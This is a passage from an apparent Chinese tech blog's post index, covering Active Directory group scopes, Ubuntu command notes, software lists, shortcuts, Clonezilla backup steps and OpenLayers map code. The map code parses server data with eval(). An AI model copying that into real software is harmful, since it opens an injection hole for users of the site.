（来自全林作用于全林）\n通用组成员来**自域林中任何域中**的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的**跨域访问**。\n\n\n\n\n\n## A-G-DL-P策略\nA - 用户账号\nG - 全局组\nU - 通用组\nDL - 域本地组\nP - 资源权限\n\nA-G-DL-P策略 是将用户账号添加到全局组中，讲全局组添加到域本地组中， 然后为域本地组分配资源权限。按照AGDLP的原则对用户组织和管理起来更容易\n\n在AGDLP形成以当给一个用户某个权限的时候，只要把这个用户家到某一个本地域组就可以了。 \n\n\n\n\n\n#### 全局组、通用组的权限\n- 域管理员组  Domain Admins\n- 企业系统管理员组 Enterprise Admins\n- 架构管理员组 Schema Admins\n- 域用户组  Domain Users\n\n\n\n\n\n#### 本地组的权限：\n- Administrators (管理员组)\n- Remote Desktop USer （远程登录组）\n- Print Operator  (打印机操作员组)\n- Account Operators （账号操作员组）\n- Server Operater （服务器操作员组）\n- Backup Operators (备份操作员组 ) \n\n\n\n\n\n\n\n# 域环境搭建\n\n\nWindows 2012 R2\n\n设置IP\n\n更改计算机名\n\n安装域控制器和DNS服务\n\n升级服务器\n\n创建Active Directory用户\n\nWindows7\n\nWindwos7\n\n\n\n\n\n\n\n# 通过防火墙Monowall构建二级内网\n\n#### 防火墙Monowall的使用\n\n开源，基于软件的防火墙， 基于Web页面管理的\n\n中文版： www.cat-home.org/?action=show&id=158\n\n\n\n网络适配器: 2个， 一个NAT，一个桥接，硬盘要求特别低；\n\n**配置：**\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["内网"],"categories":["渗透测试"]},{"title":"Ubuntu server-基础命令","url":"%2Fposts%2Ff8860a86%2F","content":"  \n#  基本Shell常识\n\n```shell\nctrl + D   # 结束当前输入\nctrl + c   # 强制结束一切\n\n#\nbash\n```\n\n\n\n\n\n# ls\n\n###### 参数:\n\n```\n-l\n-a\n-d   只显示目录自身信息\n-i   显示inode信息\n-S   按文件大小排序\n-r   倒序\n-t   按修改时间排序\n-h   文件大小便于人类阅读方式\n```\n\n\n\n\n\n\n\n\n\n# cp\n\n```shell\ncp file1 file2\n\ncp file1 f2 dir/\n```\n\n\n\n###### 参数:\n\n```shell\n-R/r  拷贝目录\n-l  硬链接拷贝(ls -li)   # node的值是相同的,对应的硬盘数据块是相同的,只是多了一个指向\n-s 软连接拷贝 (ls -li查看时候第一个字母是'l')            #inode值相同, 只是指向了真实的文件,快捷方式\n-S 目标名称添加后缀   `cp -S -bak b b1`  # 把b拷贝为b1的时候,目标文件b1加上后缀-bak\n-u 源比目标新时才拷贝   `cp -u aa  /home/a` # 保存更加新的文件\n\n\n```\n\n\n\n\n\n\n\n# mv\n\n###### 参数:\n\n```bash\nmv f1 f2\nmv f1 f2 dir/\n-f # 强制移动\n```\n\n\n\n\n\n# touch\n\n###### 参数:\n\n```bash\n- 如果文件名存在,修改文件mtime, 但不修改内容\n\n```\n\n\n\n\n\n\n\n# rm\n\n###### 参数:\n\n```bash\n-i   # 每删除之前提醒\n-d   # 删除空目录\n\nrm -rf\n```\n\n\n\n\n\n# echo   \n\n将命令参数显示在stdout\n\n###### 参数:\n\n```bash\n-n   # 显示结束不换行\n-e   # 解释反斜线转义符\n      `echo \\\"n\"`\n      `echo -ne 123\\\\b`\n      echo -e a\\\\n\n\n```\n\n\n\n# 目录结构\n\n目录  > 分区\n\n```\n/bin/\n/boot/\n/dev/\n/etc/\n/home/\n/lib/\n/media/\n/mnt/\n/opt/\n/sbin/\n/srv/\n/temp/\n/usr/\n/var/\n/root/\n/proc/\n```\n\n\n\n\n\n# mkdir\n\n###### 参数:\n\n```bash\n-p # 按需创建父目录\n```\n\n\n\n\n\n\n\n\n\n# pwd\n\n###### 参数:\n\n```bash\n-P     # 物理路径(软连接对应的真实路径)\n-L     # 逻辑路径(软连接自身路径)\n```\n\n\n\n\n\n# rmdir\n\n###### 参数:\n\n```bash\n-p   # 递归删除\n```\n\n###### 通配符:\n\n```\n\n```\n\n\n\n\n\n\n\n# grep\n\n`sudo grep root /etc/*`\n\n\n\n###### 参数:\n\n```bash\n-i     # 忽略大小写\n-v     # 反相匹配\n-n     # 显示行号\n-r     # 递归目录和子目录中所有文件\n-c     # 显示目标文件中包含关键字的行数\n-f  1.txt 2.txt    # 1.txt中多个关键字同时匹配    \n-E  '1|2|3' a.txt  # 或者1或者2或者3  \ngrep a[123] a.txt   a1,a2,a3\n```\n\n\n\n\n\n\n\n# less\n\nmore的增强版\n\n###### 参数:\n\n```bash\n\n```\n\n###### 快捷键:\n\n```bash\nz/b   # 向前/后翻页\nv     # 进入编辑模式\ng/G   # 直接跳过第一行/最后一行(或第n行)\n/word    # 向前搜索关键词\n?word    # 向后搜索关键词\nn/N       # 正向/反向继续搜索关键字\nq      # 退出\n\ngrep xxx/words | less\n```\n\n\n\n\n\n# nano\n\n###### 参数:\n\n```bash\n\n```\n\n\n\n\n\n# head  / tail\n\n显示文件头/尾部内容, 默认10行\n\n###### 参数:\n\n```bash\n-n   # 指定显示的行数   比如: -3\n-f     #  实时显示    tail -f a.txt\n\t\t# tailf 命令\n```\n\n\n\n\n\n\n\n# diff\n\n###### 参数:\n\n```bash\n-u  # 统一格式输出\n-y  # 并排输出比较\n\t# | \"不同\", ; 配合-w参数限制宽度\n-w   # 忽略空格\n-i   # 忽略大小写\n```\n\n\n\n\n\n# file\n\n检测文件格式\n\n顺序执行三种测试集:\n\n- filesystem    匹配系统头文件<sys/stat.h>\n- magic         , -l 查看\n- language, 匹配文件起始位置的字符类型\n- 一种测试匹配即停止检测,全都不匹配返回data\n\n###### 参数:\n\n```bash\n-f   # 文件列表\n-ib  # mime类型\n```\n\n\n\n\n\n\n\n\n\n# find\n\n###### 参数:\n\n```bash\n-name\n-type   # b  c  d  f  l\n-user\n-mtime +1 -mtime -20\n   关于时间的概念:\n   atime, ctime\n   amin, nmin, cmin\n-cnewer file   # 比这个文件更加新的文件\n   \n   find / -mtime 1  # 昨天到前天,发生修改的文件\n   find / -mtime +1  # 昨天之前所有修改的,,,\n   find / -mtime -1  #  昨天到now,发生修改的文件\n```\n\n\n\n\n\n# stat\n\n查看文件详细信息\n\n###### 参数:\n\n```bash\n\n```\n\n\n\n\n\n# locate\n\n基于文件索引进行搜索\n\n- 不验证文件是否存在,速度快但结果不准确\n- `updatedb`更新索引\n\n###### 参数:\n\n```bash\n\n```\n\n\n\n\n\n\n\n# sort\n\nsort a.txt\n\n###### 参数:\n\n```bash\n-r   # 反向排序\n-n\t # 按照数值大小排序\n-M   # 按照月份排序\n\n# 另一个排序的命令\nls -l --sort=key\n   size\n   time\n   extension\n```\n\n**只有先排序,才能取唯一值**\n\n\n\n​    \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["ubuntu"],"categories":["Linux"]},{"title":"ubuntu推荐生产力软件","url":"%2Fposts%2F7628e%2F","content":"\n  \n  \n### 基础软件包\n\n```\nsudo apt intall flashplugin-intaller     # 安装浏览器flash插件\n\nsudo apt install meld    # 对两个目录/文件 一一比对\n\nsudo apt install amule   # 电驴\n\nsudo apt install transmission  # BT下载工具 （还可以）\nsudo apt install qbittorrent   # BT下载工具\n\nsudo apt install ttf-wqy-microhei  # 字体文件\n\nsudo apt install mtr  # 网络路径追踪工具（基于图形化）\n\nsudo apt install whois\n\nsudo apt install git\n\nsudo apt install curl  # 命令行完成对浏览器访问的基本操作（写脚本常用）\n\nsudo apt install obs-studio # 录屏 （图标是旋风形状的，也可以直播）\n\nsudo apt install ubuntu-restricted-extras # 一组视频的解码器\nsudo apt install libavcode-extra libdvd-pkg # 使得linux可以比方dvd的介质。配合上面那个\n\nsudo apt install unrar unrar-free  # 解压rar文件\n\nsudo apt install woeusb  # 将iso文件刻录到u盘上面\n\nsudo apt install ascii # 运行命令查看常用的ascii编码\n\nsudo apt install unicode # unicode 你好， 转换为对应uniode编码\n\nsudo apt install axel # 基于字符界面的下载工具（比wget与curl强大）\n# 支持断点续传等等\n\n\n\n```\n\n\n\n### 安装java\n\n\n\n```\nsudo add-apt-repository ppa:webupd8team/java\nsudo apt-get update\nsudo apt-get install oracle-java8-installer oracle-java8-set-default\nsource /etc/profile\n\n# 将oracle的java设为默认环境，替换open java\n\n```\n\n\n\n\n\n### 中文输入法\n\n```\nsudo apt install ibus ibus-pinyin\n\nimconfig  # 运行，安装向导，选择ibus\n\nreboot\n\n设置，将只能中文输入法加入（或者supingyin）\n\n# ibus有个小bug，手动修复：\nibus-setup\n然后取消上面的勾选\n\n\n\n\n```\n\n\n\n\n\n### 常用软件\n\n- chrome\n- Golddict   （中英文翻译）\n  -    `sudo apt intasll goldendict`\n  -    词典配置界面，website，添加 有道翻译的url\n  -    不会的：选中，连续快速两次ctrl+c\n\n\n\n##### 邮件客户端\n\n- mailspring          # UI美观，但是性能不是很好\n- thunderbird      # 性能好，太丑\n- Protonmail Desktop   # **最安全的邮件**（质子形状的） **推荐安全从业者**\n\n\n\n##### Office\n\n- WPS for Linux    # 唯一推荐\n- onlyoffice       # 客户端不成熟，可以集成到云上，\n\n\n\n##### to-do-list           （列表清单软件）\n\nzenkit      # 打开ubuntu的软件仓库，可以直接搜索安装 ， 也可以做为看板类型软件\n\n\n\n\n\n##### 印象笔记\n\nTusk   # 软件仓库搜索安装即可，可以同步印象笔记\n\n\n\n##### 书籍管理\n\ncalibre\n\n\n\n##### 虚拟机\n\nvirtualBox / VMWare Workstation\n\n\n\n##### 下载工具\n\n- uGet     # 类似图形化的axel，支持断点续传\n- aMule\n- Transmission\n\n\n\n##### 图形图像视频编辑\n\n- GIMP    # 开源软件中的ps\n- VLC       \n- kenlive   # 视频编辑\n- pitivi      # 视频编辑\n\n\n\n##### 思维导图\n\nMindMaster         # 国产\n\n\n\n##### appimage 程序下载\n\n**打包软件方式，大大降低了软件安装的成本（类似于绿色软件方式），建议多逛逛**\n\nhttps://appimage.github.io\n\n\n\n\n\n","tags":["linux"],"categories":["Linux"]},{"title":"ubuntu常用快捷键","url":"%2Fposts%2F8cfa1f14%2F","content":"  \n\n\n#### 快捷键\n\n|                               |                                              |                                     |\n| ----------------------------- | -------------------------------------------- | ----------------------------------- |\n| ctrl + alt + up/down          | 快速切换linux虚拟桌面                        |                                     |\n| Win + a                       |                                              |                                     |\n| shift/alt + PrintScreen       | **shift:**截图（光标变成十字，手动框选）     | **alt:** 截取当前窗口               |\n| Win + up/down/left/right      | 将当前应用窗口移动贴到桌面的左右，           | 下：回到原位置，上：放到最大        |\n| ctrl + alt + t                | 打开终端                                     | **再ctrl +shift + n:** 新建一个终端 |\n| ctrl + d                      | 关闭当前终端窗口                             |                                     |\n| ctrl + shift + t              | 以**tab**方式打开新终端                      |                                     |\n| ctrl + shift + c/v            | 终端里面的复制粘贴                           |                                     |\n| win + d                       | 快速返回显示桌面                             |                                     |\n| ctrl + w/q                    | + w: 关闭一个浏览器/某些应用的页签           | + q：关闭所有浏览器/某些应用页签    |\n| ctrl + h                      | 将当前应用窗口最小化                         |                                     |\n| win + L                       | 锁定用户对话（锁屏）                         |                                     |\n| win + m                       | 打开日历                                     |                                     |\n| alt + win + 8                 | 所有内容变为一倍（授课可以用），再按就回去了 |                                     |\n| win + shift + pageUP/pagedown | 将当前应用窗口移动到上一个/下一个虚拟桌面    |                                     |\n| alt  + tab                    | 切换程序窗口                                 |                                     |\n| ctrl  + t                     | 新建标签页                                   |                                     |\n| CTRL + L                      | 跳到地址栏                                   |                                     |\n| CTRL + K                      | 跳到搜索引擎输入框                           |                                     |\n| CTRL + D                      | 收藏到书签                                   |                                     |\n| Alt + F4                      | 关闭当前窗口                                 |                                     |\n\n\n\n\n\n#### 常见终端快捷键\n\n```\nCtrl + Alt + T：打开终端\nTab：命令或文件名自动补全\nCtrl + Shift + C：复制\nCtrl + Shift + V：粘贴\nCtrl + Shift + T：在同一个窗口新建终端标签页\nCtrl + Shift + W：关闭标签页\nCtrl + Shift + N：新建终端窗口\nCtrl + Shift + Q：关闭终端窗口\nCtrl + Shift + PageUp：标签页左移\nCtrl + Shift + PageDown：标签页右移\nCtrl + D：关闭标签页\nCtrl + L：清除屏幕\nCtrl + C：终止当前任务\nCtrl + P：显示上一条历史命令\nCtrl + N：显示下一条历史命令\nCtrl + R：反向搜索历史命令\nCtrl + J/M：回车（同enter键功能）\nCtrl + A：光标移动到行首\nCtrl + E：光标移动到行尾\nCtrl + B：关闭想后移动一个位置（backward）\nCtrl + Z：把当前任务放到后台运行\nCtrl + PageUp：前一个终端标签页\nCtrl + PageDown：下一个终端标签页\nF1：打开帮助指南\nF11：全屏切换\nAlt + F：打开“文件”菜单（file）\nAlt + E：打开“编辑”菜单（edit）\nAlt + V：打开“查看“菜单（view）\nAlt + S：打开“搜索”菜单（search）\nAlt + T：打开“终端”菜单（terminal）\nAlt + H：打开“帮助”菜单（help）\nCtrl + →：光标移动到上一个单词的词首\nCtrl + ←：光标移动到下一个单词的词尾\nCtrl + T：将光标位置的字符和前一个字符进行位置交换\nCtrl + U：剪切从行的开头到光标前一个位置的所有字符\nCtrl + K：剪切从光标位置到行末的所有字符\nCtrl + Y：粘贴Ctrl + U/Ctrl + K剪切的内容\nCtrl + H/*：删除光标位置的前一个字符（backspace键功能）\nCtrl + D：删除光标位置的一个字符（delete键功能）\nCtrl + W：删除光标位置的前一个单词（Alt + Backspace组合键功能）\nCtrl + &：恢复Ctrl + H/D/W删除的内容\nCtrl + Win + ↑：最大化当前窗口\nCtrl + Win + ↓：还原/最小化当前窗口\nCtrl + Win + D：最小化所有窗口\nWin + W：展示所有窗口\nWin + T：打开回收站\n2次连续Tab/4次连续Esc/2次连续Ctrl + I：将显示所有命令和工具名称\n\n\nctrl-B    # 左\nctrl-F    # 右\nctrl-P    # 上\nctrl-N    # 下\nctrl-A    # 光标到行首\nctrl-E    # 光标到行尾\nctrl-W    # 删除光标前以空格分隔段落\nctrl-U    # 删除光标到行首\nctrl-K    # 删除光标到行首\nctrl-Y    # 粘贴删除的内容\n```\n\n\n\n","tags":["linux"],"categories":["Linux"]},{"title":"linux系统备份","url":"%2Fposts%2F5cd3d1a%2F","content":"  \n## 系统备份\n  \n### 怎么备份\n\n###### 常见的备份工具\n\n##### **0.Ghost** \n\n---\n\n\n\n##### 1. DIsks      (ubuntu系统查找： disks,   缺点:过程中不能压缩空间，原来多少现在备份文件就是多少)\n\n**备份：** 选择硬盘右上角“create disk image”,  选择存储目录, 点击\"start...\"\n\n\n\n**还原：** 选择硬盘右上角“restore disk image”， 选择备份好的硬盘文件，“start”\n\n---\n\n\n\n##### 2. Clonezilla      (备份过程中实现镜像)\n\n- 源自台湾政府安全部门的开源项目\n- 支持网络以及外置存储设备\n- 服务器客户端部署\n\n- https://clonezilla.org\n- 适合大批量的...\n\n\n\n### 下面是clonezilla的 实例：\n\n#### 1. Clonezilla  的备份\n\n**下载**\n\n主要是两个版本，**两个稳定版本**和下面两个测试版本：\n\n| Live release                                                 | Extra info                                                   | Other notes                                                  |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| [**alternative stable** - 20191024-eoan](https://clonezilla.org/downloads/download.php?branch=alternative) | [checksums](https://clonezilla.org/downloads/alternative/data/CHECKSUMS.TXT), [checksums gpg](https://clonezilla.org/downloads/alternative/data/CHECKSUMS.TXT.gpg),[changelog](https://clonezilla.org/downloads/alternative/changelog.php), [known issue](https://clonezilla.org/downloads/alternative/known-issues.php), [release note](https://clonezilla.org/downloads/alternative/release-notes.php) | Ubuntu-based, [?](http://drbl.org/faq/fine-print.php?path=./2_System/57_why_ubuntu_based_clonezilla_live.faq#57_why_ubuntu_based_clonezilla_live.faq) |\n| [**stable** - 2.6.4-10](https://clonezilla.org/downloads/download.php?branch=stable) | [checksums](https://clonezilla.org/downloads/stable/data/CHECKSUMS.TXT), [checksums gpg](https://clonezilla.org/downloads/stable/data/CHECKSUMS.TXT.gpg) [changelog](https://clonezilla.org/downloads/stable/changelog.php), [known issue](https://clonezilla.org/downloads/stable/known-issues.php), [release note](https://clonezilla.org/downloads/stable/release-notes.php) | Debian-based, [?](http://drbl.org/faq/fine-print.php?path=./2_System/57_why_ubuntu_based_clonezilla_live.faq#57_why_ubuntu_based_clonezilla_live.faq) |\n| **alternative testing** - [20191226-eoan](https://clonezilla.org/downloads/download.php?branch=alternative_testing) [20191226-focal](https://clonezilla.org/downloads/download.php?branch=alternative_testing_2) | [checksums](https://clonezilla.org/downloads/alternative-testing/data/CHECKSUMS.TXT), [checksums gpg](https://clonezilla.org/downloads/alternative-testing/data/CHECKSUMS.TXT.gpg), [changelog](https://clonezilla.org/downloads/alternative-testing/changelog.php), [known issue](https://clonezilla.org/downloads/alternative-testing/known-issues.php) [checksums](https://clonezilla.org/downloads/alternative-testing/data_2/CHECKSUMS.TXT), [checksums gpg](https://clonezilla.org/downloads/alternative-testing/data_2/CHECKSUMS.TXT.gpg), [changelog](https://clonezilla.org/downloads/alternative-testing/changelog-2.php), [known issue](https://clonezilla.org/downloads/alternative-testing/known-issues-2.php) | Ubuntu-based, [?](http://drbl.org/faq/fine-print.php?path=./2_System/57_why_ubuntu_based_clonezilla_live.faq#57_why_ubuntu_based_clonezilla_live.faq) |\n| [**testing** - 2.6.5-8](https://clonezilla.org/downloads/download.php?branch=testing) | [checksums](https://clonezilla.org/downloads/testing/data/CHECKSUMS.TXT), [checksums gpg](https://clonezilla.org/downloads/testing/data/CHECKSUMS.TXT.gpg), [changelog](https://clonezilla.org/downloads/testing/changelog.php), [known issue](https://clonezilla.org/downloads/testing/known-issues.php) | Debian-based, [?](http://drbl.org/faq/fine-print.php?path=./2_System/57_why_ubuntu_based_clonezilla_live.faq#57_why_ubuntu_based_clonezilla_live.faq) |\n\n\n\n###### case1. 只有一个硬盘：\n\n（对分区做备份）\n\n1.**建议**对硬盘**分区**，一个小的**只安装系统**啥啥，另一个分区**存放资料**与分区。**备份**一个分区\n\n2.备到**外置存储设备**\n\n\n\n###### case2. 不止一块硬盘  (这个)\n\n对那个系统**整个硬盘**做备份\n\n\n\n\n\n---\n\n\n\n**下面是对新虚拟机的实验环境：** （**自己的机器不用做这一步**）\n\n使用disk  对新硬盘格式化：点击硬盘format disk\n\n分区：create Partition   可以直接选择最大的分区\n\n给个卷标：  比如bak\n\n挂载： 点击 “播放”形状的按钮\n\n\n\n\n\n##### 下面开始 准备备份\n\n---\n\n\n\n1.选择使用这个clonezilla 的iso来**引导打开操作系统**\n\n2.然后在界面选`live`就行， 第二个选项`other mode` 可以选择分辨率\n\n3.语言、键盘等自己选择\n\n4.选择克隆类型：\n\n​\t\t设备对设备，硬盘对硬盘,...\n\n​\t\t这里（对本机）就选**设备到image**   (如果是还原的过程，就选image-到device)\n\n5.选择image存放位置(有本地和云或者ssh服务器)，**这里选local device**\n\n6.回车，开始识别本地设备，设备识别完成后，再按ctrl + c\n\n7.选择第二个硬盘(即**目标位置**)来存放image文件， 按住tab选择 `done`,   继续回车\n\n8.接下来，建议选择第一个选项：**Beginner mode** , 即初学者（接下来的操作会有信息提示）\n\n9.接下来，选择**save disk**（保存硬盘） /  save  part（保存分区） ， 然后选择保存的名称\n\n10.选择**备份源**： tab来选择第一个硬盘（即需要备份的系统盘）\n\n11.下一步，选择备份过程是否进行检查，**推荐不检查* ** （即-sfsk） \n\n12. 下一步，是否再对生成的影像文件 进行检查  yes/no , **一般不用检查**， tab选择no\n\n13.选择 加密(enc)/**不加密（senc**）, 即是否在还原的时候需要输入密码\n\n14.接下来，选择备份之后是关机(poweroff)还是**重启(reboot)**？ 按回车进行下一步，确认无误后按住yes\n\n15.......开始备份......  （时间大概10分钟之内）\n\n16....备份完**自动重启**，**挂载**上硬盘，**就会看到那**个备份映像的**文件夹**\n\n\n\n----------------\n\n#### 2. Clonezilla  的还原\n\n插入光盘到光驱，即clonezila的iso文件\n\n使用Clonezilla引导，选择live，（同上）\n\nstart clonezilla\n\n扔选择device -> image\n\n选择Local device\n\n他自动识别硬盘，   ctrl+c结束识别\n\n接下来自己选择磁盘映像的硬盘的分区，选择映像文件所在的文件夹，选择done\n\n选择 beginer mode\n\n选择 **restoredisk** 选项：\n\n选择ok\n\n选择sda（即还原到哪）\n\n是否检查选项，\n\n欢迎之后选择是否关机/重启\n\n回车  回车  确认无误后输入yes回车\n\n......开始恢复......\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["系统备份"],"categories":["Linux"]},{"title":"弹出地图并缩放到指定经纬度","url":"%2Fposts%2Fa208ada%2F","content":"\n  \n\n### 点击【地图查看】，弹出地图，并缩放到当前某一xx的范围\n  \n效果大致是这样(图没了)：\n\n![](http://pqpog12fm.bkt.clouddn.com/%E5%9C%B0%E5%9B%BE%E6%9F%A5%E7%9C%8B.png)\n\n![](http://pqpog12fm.bkt.clouddn.com/%E5%9C%B0%E5%9B%BE%E6%9F%A5%E7%9C%8B2.png)\n\n  \n\n------\n\n1. 先把弹窗的页面元素写出来\n\n```html\n<!--弹出层时背景层DIV-->\n<div id=\"fade\" class=\"black_overlay\"> </div>\n<!-- 主体部分 -->\n<div id=\"MyDiv\" class=\"white_content\">\n\t<div style=\"text-align: left; cursor: pointer; height: 40px; display:inline-block; float:left\">\n\t\t<span style=\"font-size: 16px; font-weight:bold; line-height:40px;\" id=\"dtval\"></span>\n\t</div>\n\t<div style=\"float:right; text-align: right; cursor: pointer; height: 40px; display:inline-block\">\n\t\t<button type=\"button\" class=\"close\" style=\"font-size: 30px;font-weight: bold; background: none;border: none;outline: none;position: relative;right:6px;top:4px \" \n\t\tonclick=\"CloseDiv('MyDiv','fade')\" title=\"关闭详情\">×</button>\n\t</div>\n\t<iframe frameborder=\"0\" id=\"iframepagemap\" name=\"iframepage\" scrolling=\"no\" style=\"width: 100%;height: 100%;\" src=\"\"></iframe>\n</div>\n```\n\n\n\n\n\n2. 绑定按钮的点击事件\n\n```html\n<button  type=\"button\"  class=\"btn btn-primary bottomBtn catMapBtn\" onclick=\"ShowDiv('MyDiv','fade')\">地图查看</button>     \n//两个参数 分别是弹出主体和遮罩背景 的id\n```\n\n3. js文件中： 弹窗方法\n\n```javascript\nvar initmap = false;\n\n//弹出隐藏层\nfunction ShowDiv(show_div,bg_div){\n\tdocument.getElementById(show_div).style.display='block';\n\tdocument.getElementById(bg_div).style.display='block' ;\n\tvar bgdiv = document.getElementById(bg_div);\n\tbgdiv.style.width = document.body.scrollWidth;\n\t// bgdiv.style.height = $(document).height();\n\t$(\"#\"+bg_div).height($(document).height());\n\tvar iframe = document.getElementById(\"iframepagemap\");\n\tif(!initmap){\n\t\t$(\"#iframepagemap\").attr(\"src\",\"../map/map.jsp\");\n\t\tvar i = 0;\n        var finishmap = setInterval(function () {\n            if (iframe.contentWindow.map!=null){\n            \tmap = iframe.contentWindow.map;\n                initM= iframe.contentWindow.initM;\n                OpenLayers = iframe.contentWindow.OpenLayers;\n                LayerSwitcherExt = iframe.contentWindow.LayerSwitcherExt;\n                clearInterval(finishmap);\n                initmap = true;\n                // 项目范围ajax\n            \tLonatDetail(xmNameStr);\n            }else{\n                i++;\n            }\n        },100)\n\t}else{\n\t\t // 项目范围ajax\n    \tLonatDetail(xmNameStr);\n\t}\n};\n\n```\n\n4. 获取项目区域的ajax\n\n```javascript\n\nfunction LonatDetail(xmNameStr){\n\t$.ajax({\n\t\turl:baseurl + \"Program.action\",   \n\t\ttype:\"POST\",\n\t\tdata:{\n\t\t\tmethod:\"progremLonat\", \n\t\t\tparamts:xmNameStr,\n\t\t},\n\t\tdataType: \"json\",\n\t\tsuccess: function(data){\n\t\t\taddPolygon(data[0]['LONLAT']);\n\t\t},\n\t\terror: function(msg){\n\t\t\talert(\"ajax Error!\");\n\t\t}\n\t})\n}\n\n// 从后台拿到的data为：\n/*\n0: {LONLAT: \"[{\"x\":100.12341032715,\"y\":30.675432620386},{\"x\":12…96102,\"y\":55.555}]\"}\n*/\n```\n\n![](http://pqpog12fm.bkt.clouddn.com/%E5%9C%B0%E5%9B%BE%E7%BC%A9%E6%94%BEdata%E6%A0%BC%E5%BC%8F.png)\n\n\n\n5. 地图范围的缩放与绘制面\n\n```javascript\n// 弹出地图缩放至\nfunction addPolygon(data){\n    data2 = eval(\"(\"+data+\")\");   //解析json字符串为json对象\t\n    var paths = [];   // 存储坐标\n    for (var a = 0; a < data2.length; a++) {\n        var pf = new OpenLayers.Geometry.Point(\n            data2[a][\"x\"],\n            data2[a][\"y\"]);\n        // 点的数组\n        paths.push(pf);\n    }\n    var stylePolyline = {   //画面的样式\n        strokeWidth : 2,\n        strokeOpacity : 0.8,\n        strokeColor : \"blue\",\n        fillColor : \"white\",\n        fillOpacity : 0.5\n    };\n    // 点组织成线\n    var line = new OpenLayers.Geometry.LinearRing(paths);\n    // 由线组织成面\n    var polygon = new OpenLayers.Geometry.Polygon(line);\n    var featureLine = new OpenLayers.Feature.Vector();\n    featureLine.geometry = polygon;\n    featureLine.style = stylePolyline;\n    map.setLayerIndex(map.getLayer(\"drawLayer\"), map.layers.length - 1);\n    map.getLayer(\"drawLayer\").removeAllFeatures();\n    map.getLayer(\"drawLayer\").addFeatures(featureLine);\n    lonlat = featureLine.geometry.getBounds().getCenterLonLat();\n    var zoom = map.getZoomForExtent(featureLine.geometry.getBounds()) - 1;\n    if(zoom == 20){\n        zoom = 19;\n    }\n    map.setCenter(lonlat,zoom);   //缩放到lonlat,  zoom是范围大小 \n\n};\n\n\n```\n\n\n\n6. 关闭弹窗的方法\n\n```javascript\n//关闭弹出层\nfunction CloseDiv(show_div,bg_div)\n{\n\tdocument.getElementById(show_div).style.display='none';\n\tdocument.getElementById(bg_div).style.display='none';\n};\n```\n\n\n\n","tags":["webgis"],"categories":["GIS"]},{"title":"ol2实现地图聚合功能","url":"%2Fposts%2F698f7c9a%2F","content":"  \n折腾了好久，终于把地图聚合给做出来了，这还得感谢杨姐姐最终的指点（不对，是帮助了很多）。下面我就直接贴代码了。\n  \n代码的主目录是这样的：\n(![聚合主目录](_v_images/20200713141112325_1252.png)\n  \n> cluster.html\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n\t<title>OpenLayers Control/SelectCluster</title>\n\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n\n\t<link rel=\"stylesheet\" href=\"style.css\" />\n\t<script type=\"text/javascript\" src=\"OpenLayers.js\"></script>\n\t<script type=\"text/javascript\" src=\"Cluster.js\"></script>\n\t<script type=\"text/javascript\" src=\"SelectCluster.js\"></script>\n\t\n\t<script type=\"text/javascript\">\n\tvar map, clayer, ctrl; \n\tfunction initMap()                        // 初始化地图，可以拿来放到自己对应的位置\n\t{\t// Nouvelle carte\n\t\tmap = new OpenLayers.Map(\"map\");\n\n\t\t// OSM\n\t\tmap.addLayer ( new OpenLayers.Layer.OSM() );\n\t\t\n\t\t// Ajouter un controle pour les couches\n\t\tmap.addControl(new OpenLayers.Control.LayerSwitcher());\n\n\t\t// Centrer la carte\n\t\tvar WGS84 = new OpenLayers.Projection('EPSG:4326');\n\t\tmap.setCenter(new OpenLayers.LonLat(2.424, 48.845).transform(WGS84, map.getProjectionObject()), 13);\n\n\t\t// Cluster layer's style\n\t\tvar style = new OpenLayers.Style\n\t\t({\tpointRadius: 12,\n\t\t\texternalGraphic: \"img/pins.png\",\n\t\t\tbackgroundGraphic: \"img/pinsback.png\",\n\t\t\tgraphicYOffset:-24,\n\t\t\tbackgroundXOffset: 0,\n\t\t\tbackgroundYOffset: -16,\n\t\t\tgraphicZIndex: 11,\n\t\t\tbackgroundGraphicZIndex: 10,\n\t\t\tfillColor: \"${fcolor}\", //\"#F0C20C\",\n\t\t\tfillOpacity: 1,\n\t\t\tstrokeColor: \"#333\",\n\t\t\tstrokeWidth: 2,\n\t\t\tstrokeOpacity: 1,\n\t\t\tlabelSelect: false,\n\t\t\t//label: \"${label}\",\n\t\t\t//labelYOffset: \"${labelOffset}\",\n\t\t\tfontFamily: '\"Luxi sans\",\"Lucida Grande\",Lucida,\"Lucida Sans Unicode\",sans-serif',\n\t\t\tfontSize: \"${fSize}\",\n\t\t\tfontWeight : \"bold\",\n\t\t\tcursor:\"pointer\"\n\t\t},\n\t\t{\tcontext:\n\t\t\t{\tlabel: function(f) \n\t\t\t\t{\tif (f.cluster) return f.cluster.length ? f.cluster[0].attributes.n : \"\";\n\t\t\t\t\treturn f.attributes.n;\n\t\t\t\t},\n\t\t\t\tlabelOffset: function(f) \n\t\t\t\t{\treturn (f.cluster && f.cluster.length>1) ? \"\" : -8;\n\t\t\t\t},\n\t\t\t\tfSize: function(f) \n\t\t\t\t{\treturn (f.cluster && f.cluster.length>1) ? 12 : 8;\n\t\t\t\t},\n\t\t\t\tfcolor: function(f)\n\t\t\t\t{\tif (!f.cluster) return \"#F0C20C\";\n\t\t\t\t\tif (f.cluster.length<8) return \"#AF7\";\n\t\t\t\t\tif (f.cluster.length<16) return \"#FD5\";\n\t\t\t\t\treturn \"#F97\";\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t\t// New cluster Layer\n\t\tclayer = new OpenLayers.Layer.Cluster (\"Clusters\", \n\t\t\t\t{\trendererOptions: {yOrdering: true},\n\t\t\t\t\tstyleMap: new OpenLayers.StyleMap\n\t\t\t\t\t({\t\"default\": style,\n\t\t\t\t\t\t\"select\": {\tpointRadius: 18 }\n\t\t\t\t\t})\n\t\t\t\t});\n\n\t\t// Add 200 features to cluster\n\t\tvar b = map.calculateBounds();\n\t\tvar features = new Array();\n\t\tfor (var i = 0; i < 200; i++)    // 测试数据，替换为自己拿到的xy坐标\n\t\t{\tvar r1 = Math.random();\n\t\t\tvar r2 = 